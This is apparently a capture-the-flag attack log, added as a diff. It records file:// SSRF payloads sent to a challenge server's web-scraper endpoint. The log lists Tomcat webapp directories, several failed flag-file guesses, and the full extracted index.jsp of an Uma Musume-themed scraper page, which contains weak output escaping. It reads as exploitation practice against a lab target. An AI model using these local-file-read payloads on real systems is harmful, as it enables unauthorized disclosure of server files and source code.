@@ -1,0 +1,619 @@
+[+] Target: http://gzcli.1pc.tf:41436
+
+[*] Trying payload: file:///usr/local/tomcat/webapps/ROOT/
+   [+] Injection successful (Got 302 Redirect)
+
+[SUCCESS] CONTENT FOUND FOR: file:///usr/local/tomcat/webapps/ROOT/
+==================================================
+clear-history.jsp
+delete-screenshot.jsp
+get-content.jsp
+index.jsp
+logout.jsp
+scraper-handler.jsp
+script.js
+styles.css
+
+==================================================
+
+[*] Trying payload: file:///usr/local/tomcat/webapps/
+   [+] Injection successful (Got 302 Redirect)
+
+[SUCCESS] CONTENT FOUND FOR: file:///usr/local/tomcat/webapps/
+==================================================
+ROOT
+WEB-INF
+
+==================================================
+
+[*] Trying payload: file:///usr/local/tomcat/webapps/ROOT/flag.txt
+   [+] Injection successful (Got 302 Redirect)
+   [-] No data returned.
+
+[*] Trying payload: file:///usr/local/tomcat/webapps/ROOT/WEB-INF/flag.txt
+   [+] Injection successful (Got 302 Redirect)
+   [-] No data returned.
+
+[*] Trying payload: file:///usr/local/tomcat/webapps/ROOT/META-INF/flag.txt
+   [+] Injection successful (Got 302 Redirect)
+   [-] No data returned.
+
+[*] Trying payload: file:///usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml
+   [+] Injection successful (Got 302 Redirect)
+   [-] No data returned.
+
+[*] Trying payload: file:///usr/local/tomcat/webapps/ROOT/index.jsp
+   [+] Injection successful (Got 302 Redirect)
+
+[SUCCESS] CONTENT FOUND FOR: file:///usr/local/tomcat/webapps/ROOT/index.jsp
+==================================================
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<%@ page import="java.util.*" %>
+<%// /usr/local/tomcat/lib/demo-1.0-SNAPSHOT.jar; anything in this root except this file isn't related to the next step %>
+<%@ page import="com.example.*" %>
+<%@ page import="java.util.Base64" %>
+<%
+    // Initialize session for training data history
+    if (session.getAttribute("trainingHistory") == null) {
+        session.setAttribute("trainingHistory", new ArrayList<Map<String, String>>());
+    }
+    
+    // Get training data history from session
+    List<Map<String, String>> history = (List<Map<String, String>>) session.getAttribute("trainingHistory");
+    
+    // Initialize user preferences
+    if (session.getAttribute("userPreferences") == null) {
+        Map<String, String> preferences = new HashMap<>();
+        preferences.put("scrapingType", "html");
+        preferences.put("includeImages", "true");
+        preferences.put("includeLinks", "true");
+        session.setAttribute("userPreferences", preferences);
+    }
+    
+    // Get user preferences
+    Map<String, String> userPrefs = (Map<String, String>) session.getAttribute("userPreferences");
+    
+    // Handle success and error messages
+    String success = request.getParameter("success");
+    String error = request.getParameter("error");
+    String url = request.getParameter("url");
+%>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Uma Musume Pretty Derby - Training Data Collection System</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@300;400;500;600;700&family=Comfortaa:wght@400;500;600;700&family=Quicksand:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Success/Error Messages -->
+    <% if (success != null) { %>
+        <div class="message success-message" id="success-message">
+            <i class="fas fa-trophy"></i>
+            <% if ("content_scraped".equals(success)) { %>
+                🏆 Training data successfully collected from <%= url != null ? url : "the racing circuit" %>! Your horse girl is getting stronger!
+            <% } else if ("history_cleared".equals(success)) { %>
+                🗂️ All training records cleared from Tracen Academy database!
+            <% } else if ("content_deleted".equals(success)) { %>
+                🗑️ Training data removed from your collection!
+            <% } else if ("logged_out".equals(success)) { %>
+                👋 You have left Tracen Academy. See you next time, trainer!
+            <% } %>
+            <button onclick="closeMessage()" class="close-message">&times;</button>
+        </div>
+    <% } %>
+    
+    <% if (error != null) { %>
+        <div class="message error-message" id="error-message">
+            <i class="fas fa-exclamation-triangle"></i>
+            <% if ("invalid_url".equals(error)) { %>
+                ❌ The racing data source you're looking for doesn't exist!
+            <% } else if ("connection_error".equals(error)) { %>
+                🔌 Unable to connect to the racing circuit. Please check your connection and try again.
+            <% } else { %>
+                ⚠️ Training failed! Please check your settings and try again, trainer.
+            <% } %>
+            <button onclick="closeMessage()" class="close-message">&times;</button>
+        </div>
+    <% } %>
+
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-logo">
+                <img src="https://static.wikia.nocookie.net/93b7bd87-b65f-4d78-89f7-e57ebdc1a27e" alt="Uma Musume Logo" class="logo-image">
+                <span>Uma Musume</span>
+            </div>
+            <ul class="nav-menu">
+                <li class="nav-item">
+                    <a href="#home" class="nav-link">🏠 Home</a>
+                </li>
+                <li class="nav-item">
+                    <a href="#scraper" class="nav-link">📊 Training Data</a>
+                </li>
+                <li class="nav-item">
+                    <a href="#history" class="nav-link">🏆 Race Records</a>
+                </li>
+                <li class="nav-item">
+                    <a href="#about" class="nav-link">👑 Horse Girls</a>
+                </li>
+                <li class="nav-item">
+                    <a href="#contact" class="nav-link">📞 Contact</a>
+                </li>
+                <li class="nav-item">
+                    <a href="logout.jsp" class="nav-link logout-btn">
+                        <i class="fas fa-sign-out-alt"></i>
+                        Leave Academy
+                    </a>
+                </li>
+            </ul>
+            <div class="hamburger">
+                <span class="bar"></span>
+                <span class="bar"></span>
+                <span class="bar"></span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section - Uma Musume Pretty Derby -->
+    <section id="home" class="hero derby-hero">
+        <div class="racing-overlay"></div>
+        <div class="hero-content">
+            <div class="race-badge">🏁 TRACEN ACADEMY</div>
+            <h1 class="hero-title">Uma Musume Pretty Derby</h1>
+            <h2 class="hero-character">🌟 Special Week — Training Data Collector</h2>
+            <p class="hero-subtitle">Welcome to Tracen Academy! Collect training data from racing circuits worldwide to help your horse girls reach their full potential and win the Triple Crown! 🏆</p>
+            <div class="hero-meme-image">
+                <img src="https://i.kym-cdn.com/photos/images/original/001/554/636/e1b.jpg" alt="Uma Musume Meme" class="meme-img">
+            </div>
+            <button class="cta-button" onclick="scrollToScraper()">
+                <i class="fas fa-play"></i>
+                🚀 Start Training Session
+            </button>
+        </div>
+        <div class="cherry-blossoms">
+            <div class="blossom" style="--delay: 0s; --x: 20%; --y: 30%;">🌸</div>
+            <div class="blossom" style="--delay: 2s; --x: 70%; --y: 60%;">🌺</div>
+            <div class="blossom" style="--delay: 4s; --x: 40%; --y: 80%;">🌸</div>
+            <div class="blossom" style="--delay: 6s; --x: 80%; --y: 20%;">🌺</div>
+            <div class="blossom" style="--delay: 8s; --x: 10%; --y: 70%;">🌸</div>
+        </div>
+    </section>
+
+    <!-- Training Data Collection Section -->
+    <section id="scraper" class="scraper-section derby-training-section">
+        <div class="container">
+            <div class="section-header">
+                <h2>🎯 Training Data Collection Center</h2>
+                <p>Gather valuable racing data from circuits worldwide to improve your horse girls' performance and help them achieve their dreams! 🌟</p>
+                <div class="trainer-quote">
+                    <div class="quote-icon">💭</div>
+                    <em>"Every race is a new opportunity to learn and grow! The more data we collect, the better our horse girls can become champions!"</em>
+                    <div class="quote-author">- Head Trainer</div>
+                </div>
+                <div class="training-tip">
+                    <i class="fas fa-lightbulb"></i>
+                    <span>💡 <strong>Pro Training Tip:</strong> Different data types help develop different aspects of your horse girl's racing abilities!</span>
+                </div>
+            </div>
+            
+            <div class="scraper-form derby-form">
+                <form id="scraper-form" action="scraper-handler.jsp" method="post">
+                    <div class="form-header">
+                        <h3>🏁 Racing Data Source</h3>
+                        <p>Enter the URL of the racing circuit you want to collect data from</p>
+                    </div>
+                    
+                    <div class="url-input-group">
+                        <div class="input-wrapper">
+                            <i class="fas fa-link input-icon"></i>
+                            <input type="url" id="website-url" name="websiteUrl" placeholder="🌐 Enter racing data source URL (e.g., https://racing-championship.com)" required>
+                        </div>
+                        <button type="submit" id="scrape-btn" class="collect-btn">
+                            <i class="fas fa-download"></i>
+                            🚀 Collect Training Data
+                        </button>
+                    </div>
+                    
+                    <div class="scraper-options derby-options">
+                        <div class="option-group">
+                            <label>📊 Data Collection Type:</label>
+                            <select id="scraping-type" name="scrapingType">
+                                <option value="html" <%= "html".equals(userPrefs.get("scrapingType")) ? "selected" : "" %>>🏆 Racing Performance Analytics</option>
+                                <option value="text" <%= "text".equals(userPrefs.get("scrapingType")) ? "selected" : "" %>>📈 Training Statistics</option>
+                                <option value="links" <%= "links".equals(userPrefs.get("scrapingType")) ? "selected" : "" %>>🔗 Circuit Network Data</option>
+                                <option value="images" <%= "images".equals(userPrefs.get("scrapingType")) ? "selected" : "" %>>📸 Horse Girl Gallery</option>
+                            </select>
+                        </div>
+                        <div class="option-group">
+                            <label>📸 Include Image Data:</label>
+                            <select id="include-images" name="includeImages">
+                                <option value="true" <%= "true".equals(userPrefs.get("includeImages")) ? "selected" : "" %>>✅ Yes</option>
+                                <option value="false" <%= "false".equals(userPrefs.get("includeImages")) ? "selected" : "" %>>❌ No</option>
+                            </select>
+                        </div>
+                        <div class="option-group">
+                            <label>🔗 Include Racing Links:</label>
+                            <select id="include-links" name="includeLinks">
+                                <option value="true" <%= "true".equals(userPrefs.get("includeLinks")) ? "selected" : "" %>>✅ Yes</option>
+                                <option value="false" <%= "false".equals(userPrefs.get("includeLinks")) ? "selected" : "" %>>❌ No</option>
+                            </select>
+                        </div>
+                    </div>
+                </form>
+            </div>
+            
+            <!-- Display most recent scraped content -->
+            <% if (!history.isEmpty()) { %>
+                <div class="scraper-result derby-result" id="scraper-result">
+                    <div class="result-header">
+                        <h3>📊 Latest Training Data Collection</h3>
+                        <div class="result-actions">
+                            <button class="action-btn download-btn" onclick="downloadContent()">
+                                <i class="fas fa-download"></i>
+                                💾 Download
+                            </button>
+                            <button class="action-btn copy-btn" onclick="copyContent()">
+                                <i class="fas fa-copy"></i>
+                                📋 Copy Data
+                            </button>
+                            <button class="action-btn view-btn" onclick="viewRawHtml()">
+                                <i class="fas fa-eye"></i>
+                                👁️ View Raw
+                            </button>
+                        </div>
+                    </div>
+                    <div class="result-content">
+                        <div class="content-preview" id="content-preview">
+                            <% 
+                                Map<String, String> latestItem = history.get(0);
+                                String content = latestItem.get("content");
+                                String scrapingType = latestItem.get("scrapingType");
+                                
+                                if (content != null) {
+                                    try {
+                                        // Decode Base64 content
+                                        byte[] decodedBytes = java.util.Base64.getDecoder().decode(content);
+                                        String decodedContent = new String(decodedBytes, "UTF-8");
+                                        
+                                        if ("html".equals(scrapingType)) {
+                                            // For HTML content, use iframe srcdoc with decoded content
+                                            String escapedHtml = decodedContent
+                                                .replace("'", "&#39;")
+                                                .replace("\"", "&quot;")
+                                                .replace("&", "&amp;");
+                                            
+                                            out.println("<div id='html-preview-container'>");
+                                            out.println("<div class='html-preview-label'>🔍 Training Data Preview</div>");
+                                            out.println("<iframe id='html-preview-iframe' srcdoc='" + escapedHtml + "' sandbox='allow-same-origin'></iframe>");
+                                            out.println("</div>");
+                                        } else {
+                                            // For non-HTML content, show as text
+                                            if (decodedContent.length() > 1000) {
+                                                out.println(decodedContent.substring(0, 1000) + "...\n\n[📋 Data truncated for display. Use 'View Raw' to see the complete training data.]");
+                                            } else {
+                                                out.println(decodedContent);
+                                            }
+                                        }
+                                    } catch (Exception e) {
+                                        // If decoding fails (binary data), show a message
+                                        out.println("[Binary content - " + content.length() + " characters of Base64 data]\n\n");
+                                        out.println("This appears to be binary data (ZIP, image, etc.). Use the Download button to get the original file.");
+                                    }
+                                } else {
+                                    out.println("🚫 No training data found at this racing circuit source");
+                                }
+                            %>
+                        </div>
+                    </div>
+                    <div class="result-info">
+                        <div class="info-item">
+                            <strong>🌐 Source:</strong> 
+                            <span id="scraped-url"><%= latestItem.get("url") %></span>
+                        </div>
+                        <div class="info-item">
+                            <strong>📊 Data Type:</strong> 
+                            <span id="scraped-type"><%= latestItem.get("scrapingType") %></span>
+                        </div>
+                        <div class="info-item">
+                            <strong>📏 Size:</strong> 
+                            <span id="scraped-size"><%= latestItem.get("size") %></span>
+                        </div>
+                        <div class="info-item">
+                            <strong>🎫 Session ID:</strong> 
+                            <span id="session-id"><%= session.getId() %></span>
+                        </div>
+                    </div>
+                </div>
+            <% } %>
+        </div>
+    </section>
+
+    <!-- Race Records Section -->
+    <section id="history" class="history derby-history">
+        <div class="container">
+            <div class="section-header">
+                <h2>🏆 Tracen Academy Training Records</h2>
+                <p>Your complete collection of training data from racing circuits around the world! 🌍</p>
+                <div class="trainer-records-quote">
+                    <div class="quote-icon">📋</div>
+                    <em>"Every piece of data brings us closer to victory! Keep track of your training progress and help your horse girls reach their full potential!"</em>
+                    <div class="quote-author">- Training Supervisor</div>
+                </div>
+                <div class="history-actions-top">
+                    <button class="action-btn danger-btn" onclick="clearHistory()">
+                        <i class="fas fa-trash"></i>
+                        🗑️ Clear All Records
+                    </button>
+                    <button class="action-btn success-btn" onclick="exportHistory()">
+                        <i class="fas fa-file-export"></i>
+                        📤 Export Training Data
+                    </button>
+                </div>
+            </div>
+            
+            <div class="history-grid" id="history-grid">
+                <% if (history.isEmpty()) { %>
+                    <div class="empty-history">
+                        <div class="empty-icon">📚</div>
+                        <h3>🎯 No Training Records Yet</h3>
+                        <p>Start collecting training data from racing circuits to help your horse girls improve! 🏃‍♀️</p>
+                        <button class="cta-button" onclick="scrollToScraper()">
+                            <i class="fas fa-play"></i>
+                            🚀 Start First Training Session
+                        </button>
+                    </div>
+                <% } else { %>
+                    <% for (Map<String, String> item : history) { %>
+                        <div class="history-item derby-card">
+                            <div class="card-header">
+                                <div class="card-title">🏁 <%= item.get("url") %></div>
+                                <div class="card-badge <%= item.get("scrapingType") %>-badge">
+                                    <%= "html".equals(item.get("scrapingType")) ? "🏆 Performance" : 
+                                        "text".equals(item.get("scrapingType")) ? "📈 Statistics" : 
+                                        "links".equals(item.get("scrapingType")) ? "🔗 Network" : "📸 Gallery" %>
+                                </div>
+                            </div>
+                            <div class="card-content">
+                                <p class="preview-text"><%= item.get("preview") != null ? (item.get("preview").length() > 120 ? item.get("preview").substring(0, 120) + "..." : item.get("preview")) : "No preview available" %></p>
+                                <div class="card-stats">
+                                    <div class="stat-item">
+                                        <i class="fas fa-calendar"></i>
+                                        <span><%= item.get("timestamp") %></span>
+                                    </div>
+                                    <div class="stat-item">
+                                        <i class="fas fa-database"></i>
+                                        <span><%= item.get("size") %></span>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="card-actions">
+                                <button class="card-btn view-btn" onclick="viewHistoryContent(this)" data-url="<%= item.get("url") %>">
+                                    <i class="fas fa-eye"></i>
+                                    👁️ View
+                                </button>
+                                <button class="card-btn download-btn" onclick="downloadHistoryContent(this)" data-url="<%= item.get("url") %>">
+                                    <i class="fas fa-download"></i>
+                                    💾 Download
+                                </button>
+                                <button class="card-btn delete-btn" onclick="deleteHistoryContent(this)" data-url="<%= item.get("url") %>">
+                                    <i class="fas fa-trash"></i>
+                                    🗑️ Delete
+                                </button>
+                            </div>
+                        </div>
+                    <% } %>
+                <% } %>
+            </div>
+        </div>
+    </section>
+
+    <!-- Uma Musume Horse Girls Section -->
+    <section id="about" class="about derby-girls">
+        <div class="container">
+            <div class="about-content">
+                <div class="about-text">
+                    <h2>👑 Uma Musume Pretty Derby Horse Girls</h2>
+                    <div class="derby-legend">
+                        <div class="legend-header">
+                            <h3>🏇 About Uma Musume Pretty Derby</h3>
+                        </div>
+                        <p>Uma Musume Pretty Derby is a multimedia franchise featuring anthropomorphic horse girls based on legendary racehorses. These talented horse girls compete in thrilling races while pursuing their dreams of becoming champions at Tracen Academy! 🏆</p>
+                        <p>Our advanced training data collection system helps trainers gather valuable information about racing performance, training methods, and horse girl statistics to support their journey to victory! 🌟</p>
+                    </div>
+                    <div class="horse-girls-grid">
+                        <div class="horse-girl-card featured">
+                            <div class="girl-avatar">🌟</div>
+                            <div class="girl-info">
+                                <h3>Special Week</h3>
+                                <div class="girl-rank">⭐⭐⭐</div>
+                                <p>The energetic protagonist who dreams of becoming Japan's best racehorse! Known for her determination and cheerful personality.</p>
+                            </div>
+                        </div>
+                        <div class="horse-girl-card">
+                            <div class="girl-avatar">👑</div>
+                            <div class="girl-info">
+                                <h3>Silence Suzuka</h3>
+                                <div class="girl-rank">⭐⭐⭐</div>
+                                <p>The silent speedster known for her incredible racing ability and graceful running style.</p>
+                            </div>
+                        </div>
+                        <div class="horse-girl-card">
+                            <div class="girl-avatar">⚡</div>
+                            <div class="girl-info">
+                                <h3>Tokai Teio</h3>
+                                <div class="girl-rank">⭐⭐⭐</div>
+                                <p>The emperor of the racing world with unmatched determination and royal presence.</p>
+                            </div>
+                        </div>
+                        <div class="horse-girl-card">
+                            <div class="girl-avatar">🌸</div>
+                            <div class="girl-info">
+                                <h3>Mejiro McQueen</h3>
+                                <div class="girl-rank">⭐⭐⭐</div>
+                                <p>The elegant and graceful racer from the prestigious Mejiro family.</p>
+                            </div>
+                        </div>
+                        <div class="horse-girl-card">
+                            <div class="girl-avatar">🎵</div>
+                            <div class="girl-info">
+                                <h3>Gold Ship</h3>
+                                <div class="girl-rank">⭐⭐⭐</div>
+                                <p>The unpredictable and fun-loving horse girl with a unique racing style.</p>
+                            </div>
+                        </div>
+                        <div class="horse-girl-card">
+                            <div class="girl-avatar">🏃‍♀️</div>
+                            <div class="girl-info">
+                                <h3>Vodka</h3>
+                                <div class="girl-rank">⭐⭐⭐</div>
+                                <p>The rival and friend of Daiwa Scarlet, known for her competitive spirit.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="training-story">
+                        <h3>🎯 Training Data Collection System</h3>
+                        <div class="story-content">
+                            <p><strong>🏆 Trainer Guide:</strong></p>
+                            <p>Welcome to Tracen Academy's advanced training data collection system! Just like how horse girls need proper training and data analysis to improve their racing performance, our web scraper helps you gather valuable information from various racing-related websites around the world.</p>
+                            <p>Whether you're looking for racing statistics, training methodologies, or horse girl profiles, our system can help you collect and organize this data efficiently to support your horse girls' journey to victory! 🌟</p>
+                            <div class="start-training">
+                                <button class="cta-button" onclick="scrollToScraper()">
+                                    <i class="fas fa-play"></i>
+                                    🚀 Start Training Now
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section id="contact" class="contact derby-contact">
+        <div class="container">
+            <div class="section-header">
+                <h2>📞 Tracen Academy Contact Center</h2>
+                <p>Get in touch with our training team for support and guidance! 🤝</p>
+            </div>
+            <div class="contact-content">
+                <div class="contact-info">
+                    <div class="contact-item">
+                        <div class="contact-icon">📧</div>
+                        <div class="contact-details">
+                            <h3>Email Support</h3>
+                            <p>trainer@tracen-academy.jp</p>
+                        </div>
+                    </div>
+                    <div class="contact-item">
+                        <div class="contact-icon">📱</div>
+                        <div class="contact-details">
+                            <h3>Phone Support</h3>
+                            <p>+81 3-1234-5678</p>
+                        </div>
+                    </div>
+                    <div class="contact-item">
+                        <div class="contact-icon">🏢</div>
+                        <div class="contact-details">
+                            <h3>Training Center</h3>
+                            <p>Tracen Academy, Tokyo, Japan</p>
+                        </div>
+                    </div>
+                </div>
+                <form class="contact-form derby-contact-form" action="ContactServlet" method="post">
+                    <div class="form-header">
+                        <h3>💌 Send Message to Training Team</h3>
+                    </div>
+                    <div class="form-group">
+                        <label>👤 Trainer Name:</label>
+                        <input type="text" name="name" placeholder="Enter your trainer name" required>
+                    </div>
+                    <div class="form-group">
+                        <label>📧 Email Address:</label>
+                        <input type="email" name="email" placeholder="Enter your email address" required>
+                    </div>
+                    <div class="form-group">
+                        <label>📋 Subject:</label>
+                        <input type="text" name="subject" placeholder="What's your message about?" required>
+                    </div>
+                    <div class="form-group">
+                        <label>💭 Message:</label>
+                        <textarea name="message" placeholder="Tell us how we can help you and your horse girls!" rows="5" required></textarea>
+                    </div>
+                    <button type="submit" class="submit-btn">
+                        <i class="fas fa-paper-plane"></i>
+                        📤 Send Message
+                    </button>
+                </form>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer derby-footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <div class="footer-logo">
+                        <img src="https://static.wikia.nocookie.net/93b7bd87-b65f-4d78-89f7-e57ebdc1a27e" alt="Uma Musume Logo" class="logo-image">
+                        <span>Uma Musume Pretty Derby</span>
+                    </div>
+                    <p>🏆 Advanced training data collection system for horse girls and racing enthusiasts at Tracen Academy.</p>
+                    <div class="social-links">
+                        <a href="#"><i class="fab fa-facebook"></i></a>
+                        <a href="#"><i class="fab fa-twitter"></i></a>
+                        <a href="#"><i class="fab fa-instagram"></i></a>
+                        <a href="#"><i class="fab fa-youtube"></i></a>
+                    </div>
+                </div>
+                <div class="footer-section">
+                    <h3>🔗 Quick Links</h3>
+                    <ul>
+                        <li><a href="#home">🏠 Home</a></li>
+                        <li><a href="#scraper">📊 Training Data</a></li>
+                        <li><a href="#history">🏆 Race Records</a></li>
+                        <li><a href="#about">👑 Horse Girls</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h3>📈 Data Types</h3>
+                    <ul>
+                        <li><a href="#scraper">🏆 Racing Performance</a></li>
+                        <li><a href="#scraper">📈 Training Statistics</a></li>
+                        <li><a href="#scraper">🔗 Circuit Network</a></li>
+                        <li><a href="#history">📚 Historical Records</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h3>📬 Newsletter</h3>
+                    <p>Subscribe to get updates on new training data and racing insights! 🌟</p>
+                    <form class="newsletter-form" action="NewsletterServlet" method="post">
+                        <input type="email" name="email" placeholder="Enter your email address" required>
+                        <button type="submit">
+                            <i class="fas fa-arrow-right"></i>
+                        </button>
+                    </form>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2024 Uma Musume Pretty Derby - Tracen Academy. All rights reserved. | 🎫 Session ID: <%= session.getId() %></p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Lightbox for Raw HTML -->
+    <div id="lightbox" class="lightbox">
+        <span class="close-lightbox">&times;</span>
+        <div class="lightbox-content" id="lightbox-content">
+            <pre id="raw-html-content"></pre>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html> 
+==================================================
